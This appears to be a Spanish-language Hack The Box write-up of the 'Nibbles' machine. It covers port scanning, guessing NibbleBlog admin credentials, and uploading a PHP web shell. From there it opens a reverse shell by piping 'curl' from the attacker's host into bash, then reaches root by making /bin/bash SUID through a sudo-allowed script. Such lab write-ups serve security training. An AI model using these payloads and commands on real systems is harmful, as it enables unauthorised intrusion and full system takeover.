---
title: Text and Typography
author: cotes
date: 2019-08-08 11:33:00 +0800
categories: [Blogging, Demo]
tags: [typography]
pin: true
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Nibbles/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Nibbles Machine Logo
---

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos en la **`Máquina Nibbles`**

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Nibbles/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos.

* **`nmap -p<Ports> -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Nibbles/02-versions.png)

c. Al ver el código fuente de la página web inicial, veremos una directorio por el cual podremos empezar a fuzzear

![](/assets/images/HTB/Easy/Nibbles/03-leak.png)


* El sitio web está levantado con **`NibbleBlog`** y podemos ver su código fuente en **`Github`** [NibbleBlog](https://github.com/dignajar/nibbleblog). Con esto podemos evitarnos realizar fuzzing.


* El directorio **`content`** contiene el directorio **`/private`** en el cual existe un fichero **`users.xml`**

    ```xml
    <user username="admin">
    <SNIP>
    ```

d. En el repositorio vemos un fichero **`admin.php`**, que es un panel de login, pero, al no poseer la contraseña del usuario **admin**, probamos con palabras comunes

* **`admin:admin`, `admin:password`, `admin:nibbles`**

e. Una vez autenticados, iremos al apartado de **`Plugins -> My Image`**. Intentamos subir un fichero **`php`** con el contenido **`<?php system($_GET["cmd"]); ?>`**

* Como nos fijamos, no existe ningun tipo de sanitización por lo que la 'imagen' se subió normalmente, para verla nos iremos a la siguiente ruta **`http://<IP>/nibbleblog/content/private/plugins/my_image/`**.

    ![](/assets/images/HTB/Easy/Nibbles/05-file_upload.png)

* Una vez garantizada la ejecución remota de comandos, entablamos una reverse shell.

    * **URL:** **`http://<IP Nibbles>/nibbleblog/content/private/plugins/my_image/image.php?cmd=curl%20http://<tun0 IP>:<Port>|bash`**

    ![](/assets/images/HTB/Easy/Nibbles/06-reverse.png)

### Escalada de Privilegios 💹

a. Listamos privilegios de tipos sudoers, que podamos tener

```bash
nibbler@Nibbles:/home/nibbler$ sudo -l

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

* Podemos ejecutar como root el archivo **`monitor.sh`**, sin embargo, este no existe, por lo que, al estar en nuestro directorio personal, lo que haremos es crear los directorios y el fichero con un script que otorgue el permiso **`SUID`** a la **`bash`**

    ```bash
    nibbler@Nibbles:/home/nibbler$ tree -fas
    .
    |-- [       4096]  ./personal
    |   `-- [       4096]  ./personal/stuff
    |       `-- [         18]  ./personal/stuff/monitor.sh

    nibbler@Nibbles:/home/nibbler/personal/stuff/$ cat monitor.sh
    chmod +s /bin/bash
    nibbler@Nibbles:/home/nibbler/personal/stuff/$ chmod +x monitor.sh
    ```

b. Ahora ejecutamos el script como **root**

```bash
nibbler@Nibbles:/home/nibbler$ sudo /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash
nibbler@Nibbles:/home/nibbler$ bash -p
bash-4.3# whoami
root
```

> Con esto hemos vulnerado la `Máquina Nibbles`
{: .prompt-tip }